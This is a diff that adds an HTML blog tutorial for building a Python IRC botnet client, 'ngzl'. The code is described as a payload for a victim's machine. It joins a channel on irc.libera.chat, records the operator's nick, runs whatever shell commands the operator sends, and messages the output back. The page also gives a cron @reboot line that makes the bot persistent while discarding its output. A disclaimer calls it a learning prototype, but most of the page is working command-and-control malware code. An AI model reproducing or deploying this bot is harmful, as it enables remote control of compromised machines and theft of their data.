@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="keywords" content="">
+        <meta name="author" content="">
+
+        <!-- Open Graph / Facebook / Discord -->
+        <meta property="og:type" content="website">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="https://syswraith.github.io/elanor">
+        <meta property="og:image" content="https://github.com/syswraith/elanor/blob/main/assets/icon.png?raw=true">
+
+        <!-- Twitter -->
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="">
+        <meta name="twitter:description" content="">
+        <meta name="twitter:image" content="https://github.com/syswraith/elanor/blob/main/assets/icon.png?raw=true">
+        <meta property="twitter:domain" content="syswraith.github.io">
+        <meta property="twitter:url" content="https://syswraith.github.io/elanor">
+
+
+        <title></title>
+        <style>html{visibility: hidden;opacity:0;}</style>
+        <link rel="stylesheet" href="pygments.css" type="text/css">
+        <link rel="stylesheet" href="https://unpkg.com/sakura.css/css/sakura.css" type="text/css" media="print" onload="this.media='all'">
+        <link rel="icon" type="image/x-icon" href="favicon.ico">
+        <script>
+            window.onload = () => { 
+                document.querySelector('html').style.visibility = "visible";
+                document.querySelector('html').style.opacity = 1;
+            };
+        </script>
+
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+        <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+        <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+        <script>
+            document.addEventListener("DOMContentLoaded", function() {
+                renderMathInElement(document.body, {
+                    delimiters: [
+                        {left: "$$", right: "$$", display: true},
+                        {left: "\\(", right: "\\)", display: false}
+                    ]
+                });
+            });
+        </script>
+
+        <noscript>
+            This page uses minimal and non-harmful JavaScript to avoid Flash of Unstyled Content. 
+            The source code is available at https://github.com/syswraith/elanor free for anyone to inspect or modify. 
+        </noscript>
+    </head>
+    <body>
+        <h2>TL;DR</h2>
+<ul>
+<li><a href="https://github.com/syswraith/ngzl">The script</a></li>
+<li>Python script that uses the IRC protocol to issue commands to the bots and send back output to the bot herder.</li>
+<li>If extended, can include functionality such as:<ul>
+<li>[x] Daemonizing with <code>cron</code></li>
+<li>[x] Auto-update</li>
+<li>[ ] Auto-corrupt</li>
+</ul>
+</li>
+</ul>
+<h2>Words of caution</h2>
+<ul>
+<li>Using this script for nefarious purposes is strictly prohibited and I will not be responsible for any damages that may be caused. </li>
+<li>This script was authored by me for the purpose of learning more about Python libraries, mainly <code>os</code>, <code>socket</code> and <code>subprocess</code>. It does not follow the best practices or conventions. It's just a really basic prototype.</li>
+</ul>
+<h1>About the IRC protocol.</h1>
+<blockquote>
+<p>The IRC protocol was developed over the last 4 years since it was first implemented as a means for users on a BBS to chat amongst themselves. Now it supports a world-wide network of servers and clients, and is stringing to cope with growth. </p>
+<p>Over the past 2 years, the average number of users connected to the main IRC network has grown by a factor of 10. </p>
+<p>The IRC protocol is a text-based protocol, with the simplest client being any socket program capable of connecting to the server. </p>
+<p>~ <em>Abstract, RFC 1459</em></p>
+</blockquote>
+<ul>
+<li>IRC is a TCP-based protocol that supports multi-user communication in real time. </li>
+<li>It was created in 1988 by Jarkko "WiZ" Oikarinen at the University of Oulu in Finland, to extend his BBS software.</li>
+<li>Anything that connected to the IRC server is termed as a client.</li>
+<li>The protocol was then formalized in RFC 1459 when the specification was laid out for the general public.</li>
+<li>IRC is insecure by default- all communications are made using plaintext and are unencrypted.</li>
+<li>Some of the popular IRC servers operating today are <a href="https://libera.chat">Libera Chat</a>, <a href="https://freenode.net/">Freenode</a>, <a href="https://www.ircnet.com/">IRCnet</a>, etc.</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>                           [ Server 15 ]  [ Server 13 ] [ Server 14]
+                                 /                \         /
+                                /                  \       /
+        [ Server 11 ] ------ [ Server 1 ]       [ Server 12]
+                              /        \          /
+                             /          \        /
+                  [ Server 2 ]          [ Server 3 ]
+                    /       \                      \
+                   /         \                      \
+           [ Server 4 ]    [ Server 5 ]         [ Server 6 ]
+            /    |    \                           /
+           /     |     \                         /
+          /      |      \____                   /
+         /       |           \                 /
+ [ Server 7 ] [ Server 8 ] [ Server 9 ]   [ Server 10 ]
+
+                                  :
+                               [ etc. ]
+                                  :
+
+                 [ Format of IRC server network ]
+</code></pre></div>
+
+<h1>About Botnets</h1>
+<ul>
+<li>A botnet is a group of devices, which can be used to perform malicious activities such as distributed denial of service attacks, steal personal information, send spam and allow the attacker to access and utilise the device's network and resources.</li>
+<li>Malware infecting a machine through various means (phishing emails, malicious websites, vulnerable software) is the main cause of creation of a botnet. Malware turns devices into "zombies" or "bots" that are under the attackers command.</li>
+<li>Botnets have traditionally followed the client-server architecture, but nowadays we see the rise of peer-to-peer type networks as well.</li>
+<li>Known botnets include the <a href="https://en.wikipedia.org/wiki/Carna_botnet">Carna Botnet</a>, <a href="https://en.wikipedia.org/wiki/Zeus_(malware)">ZeuS</a>, <a href="https://en.wikipedia.org/wiki/Carna_botnet">Mirai</a>, etc.</li>
+</ul>
+<h1>Creating a botnet script</h1>
+<p>The program that we will work on is a payload that will execute on a victim's machine, and turn it into a "bot". The code is available at <a href="https://github.com/syswraith/ngzl">syswraith/ngzl</a> under the MIT license.
+This is its directory structure:</p>
+<div class="codehilite"><pre><span></span><code>.
+├── init.sh
+├── ngzl.py
+└── README.md
+
+1 directory, 3 files
+</code></pre></div>
+
+<p>Files of importance are:
+- <code>init.sh</code> this script calls ngzl.py. It was added so that the botnet script can update itself more easily. More on this later.
+- <code>ngzl.py</code> this is the main script that turns the device into a bot. This script is assumed to be executed with <strong>superuser</strong> priviledges.</p>
+<h2>Steps:</h2>
+<ol>
+<li>First, we will decide what service we're going to use. I am familiar with Libera Chat. Following are the configuration options that I have decided on.</li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="n">server</span> <span class="o">=</span> <span class="s2">&quot;irc.libera.chat&quot;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">6667</span>
+<span class="n">channel</span> <span class="o">=</span> <span class="s2">&quot;#feycomm&quot;</span>
+<span class="n">nick</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">uname</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;09&quot;</span>
+</code></pre></div>
+
+<ol>
+<li>We define a function named <code>connect_routine</code> with the above configurations as parameters. In this function, we create a basic TCP socket and connect to the server and port.</li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="n">irc</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">irc</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">server</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</code></pre></div>
+
+<ol>
+<li>We also send the respective commands to set the nickname and join the channel that we decided on before. Note that these commands need to be encoded as <strong>bytes</strong> and NOT as normal strings.</li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="n">irc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;NICK </span><span class="si">{</span><span class="n">nick</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">irc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;USER </span><span class="si">{</span><span class="n">nick</span><span class="si">}</span><span class="s2"> 0 * :</span><span class="si">{</span><span class="n">nick</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">irc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;JOIN </span><span class="si">{</span><span class="n">channel</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">irc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;PRIVMSG </span><span class="si">{</span><span class="n">channel</span><span class="si">}</span><span class="s2"> :</span><span class="si">{</span><span class="n">nick</span><span class="si">}</span><span class="s2"> has connected. Awaiting username capture.</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</code></pre></div>
+
+<ol>
+<li>Now we need to listen for broadcasted messages. Since we don't know how long we'll be listening for, we will use a infinite <code>while</code> loop to listen continuously.</li>
+<li>Since we don't need to read the whole response, we will only read 2048 bytes into it. </li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">irc</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</code></pre></div>
+
+<ol>
+<li>Now to the crux of the program. There are three main features that I'm going to implement- the ability of the bot to respond to PINGS, the ability of the bot to record the username of the bot operator, and the ability to execute the commands issued by the bot operator. The second feature is vital for the third to work.</li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="nt">graph</span><span class="w"> </span><span class="nt">TD</span>
+<span class="w">  </span><span class="nt">Decision</span><span class="cp">[</span><span class="s2">&quot;Decision&quot;</span><span class="cp">]</span><span class="o">:</span><span class="p">::</span><span class="nd">diamond</span>
+<span class="w">  </span><span class="nt">Decision</span><span class="w"> </span><span class="nt">--</span><span class="o">&gt;|</span><span class="s2">&quot;PING&quot;</span><span class="o">|</span><span class="w"> </span><span class="nt">Respond</span><span class="cp">[</span><span class="s2">&quot;Respond with PONG&quot;</span><span class="cp">]</span>
+<span class="w">  </span><span class="nt">Decision</span><span class="w"> </span><span class="nt">--</span><span class="o">&gt;|</span><span class="s2">&quot;Record username&quot;</span><span class="o">|</span><span class="w"> </span><span class="nt">Record</span><span class="cp">[</span><span class="s2">&quot;Parse and record the username&lt;br&gt;of the bot operator&quot;</span><span class="cp">]</span>
+<span class="w">  </span><span class="nt">Decision</span><span class="w"> </span><span class="nt">--</span><span class="o">&gt;|</span><span class="s2">&quot;Issued commands&quot;</span><span class="o">|</span><span class="w"> </span><span class="nt">Issue</span><span class="cp">[</span><span class="s2">&quot;Execute the&lt;br&gt;issued commands&quot;</span><span class="cp">]</span>
+
+<span class="w">  </span><span class="nt">classDef</span><span class="w"> </span><span class="nt">diamond</span><span class="w"> </span><span class="nt">shape</span><span class="p">:</span><span class="nd">diamond</span><span class="o">,</span><span class="w"> </span><span class="nt">font-size</span><span class="p">:</span><span class="nd">25px</span><span class="o">;</span>
+</code></pre></div>
+
+<ol>
+<li>The first one is simple enough, you just have to respond with <code>PONG</code> every time someone says <code>PING</code>, followed by the server name.</li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;PING&quot;</span><span class="p">):</span>
+    <span class="n">server_data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># Get everything after the &quot;:&quot;</span>
+    <span class="n">irc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;PONG :</span><span class="si">{</span><span class="n">server_data</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">this is for the following PING messages:</span>
+<span class="sd">PING :lead.libera.chat</span>
+<span class="sd">PING :iridium.libera.chat</span>
+<span class="sd">&quot;&quot;&quot;</span>
+</code></pre></div>
+
+<ol>
+<li>IRC messages follow a <em>pseudo BNF</em> format- they are prefixed with a <code>:</code> and are always suffixed with trailing <code>CR-LF</code> characters. A message from a user looks like this:
+    <code>:Guest99!~Guest99@2402:e281:3d7e:4e:5e9:d2a2:e8ce:6b02 PRIVMSG #feycomm :hello</code>
+    To get the username of the bot operator, we need to parse the response. Here, we note the positions of <code>:</code> and <code>!</code>, whatever string follows in between is the username.</li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="k">elif</span> <span class="s2">&quot;IDENTIFY-9&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
+    <span class="n">startIndex</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
+    <span class="n">endIndex</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&quot;!&quot;</span><span class="p">)</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="n">startIndex</span><span class="p">:</span><span class="n">endIndex</span><span class="p">]</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Username captured: `</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">`&quot;</span><span class="p">)</span>
+    <span class="n">irc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;PRIVMSG </span><span class="si">{</span><span class="n">channel</span><span class="si">}</span><span class="s2"> :Username captured: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">. Awaiting commands.</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</code></pre></div>
+
+<ol>
+<li>Next is the interesting part! We have recorded the username in the previous step so that we can send <code>PRIVMSGs</code> to the operator. It is intentionally designed because a single bot cannot send a flood of input (read: command output) to the IRC server (the server rate-limits you, I checked) and it cannot send too many messages too quickly. Therefore we <code>time.sleep()</code> our messages and send them to the bot operator directly instead of sending them in the channel, as to avoid confusion.</li>
+</ol>
+<div class="codehilite"><pre><span></span><code><span class="k">elif</span> <span class="s2">&quot;&lt;9&gt;&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span> 
+    <span class="n">command</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="n">response</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&quot;&lt;9&gt; &quot;</span><span class="p">)</span><span class="o">+</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Command issued: `</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s2">`&quot;</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">resultxt</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">resultxt</span><span class="p">:</span> 
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">irc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;PRIVMSG </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2"> :</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</code></pre></div>
+
+<p>And that's it! That's the core functionality of the script. </p>
+<h3>Miscellaneous</h3>
+<p>Here's a little update function that may aid in the updating of the <code>init.sh</code> script.</p>
+<div class="codehilite"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">update_init</span><span class="p">():</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;new_init.sh&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="c1"># logic to get new content here</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;UPDATED CONTENT GOES HERE&quot;</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;new_init.sh&quot;</span><span class="p">,</span> <span class="s2">&quot;init.sh&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>And here's the command to <em>daemonize</em> the script using <code>cron</code> and run it on startup. Output and errors are discarded.</p>
+<div class="codehilite"><pre><span></span><code>crontab<span class="w"> </span>-e
+
+<span class="c1"># Add the following line</span>
+@reboot<span class="w"> </span>nohup<span class="w"> </span>path-to-script/init.sh<span class="w"> </span>&gt;<span class="w"> </span>/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="nb">disown</span>
+</code></pre></div>
+    </body>
+</html>
